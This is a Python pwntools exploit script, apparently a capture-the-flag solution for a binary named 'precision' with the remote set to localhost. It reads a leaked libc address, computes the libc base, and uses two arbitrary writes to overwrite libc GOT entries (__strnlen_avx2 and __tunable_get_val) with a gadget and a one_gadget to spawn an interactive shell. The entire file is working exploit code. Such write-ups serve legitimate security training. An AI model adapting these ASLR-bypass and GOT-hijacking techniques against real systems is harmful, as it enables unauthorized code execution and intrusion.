#!/usr/bin/env python3
from pwn import *

# ------------------------- TARGET ------------------------- #
elf = context.binary = ELF("./precision")
rop = ROP(elf)

# -------------------------- LIBC -------------------------- #
libc = ELF(elf.libc.path)
rop_libc = ROP(libc)

# -------------------------- ARGS -------------------------- #
if args.REMOTE:
    p = remote("127.0.0.1", 9004)
else:
    p = process(elf.path)
    if args.GDB:
        gdbscript = """
        c
        """
        gdb.attach(p, gdbscript=gdbscript)

# ------------------------- EXPLOIT ------------------------ #

# Leak LIBC address
libc_leak = int(
    p.recvline_startswith(b"Coordinates: ")[13:].decode(errors="ignore"), 16
)
info(f"LIBC LEAK: 0x{libc_leak:x}")

# Calculate LIBC address
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
info(f"LIBC ADDRESS: 0x{libc.address:x}")

# First write
first_addr = libc.address + 0x219098  # __strnlen_avx2@got
first_value = libc.address + 0x97583  # xor eax, eax; call __tunable_get_val@plt
p.sendlineafter(b">> ", str(first_addr).encode())
p.sendafter(b"First chance: ", p64(first_value))

# Second write
second_addr = libc.address + 0x219178  # __tunable_get_val@got
second_value = libc.address + 0xEBDAF  # one_gadget -> rax == NULL && [rbp-0x70] == NULL
p.sendlineafter(b">> ", str(second_addr).encode())
p.sendafter(b"Second chance: ", p64(second_value))

p.interactive()
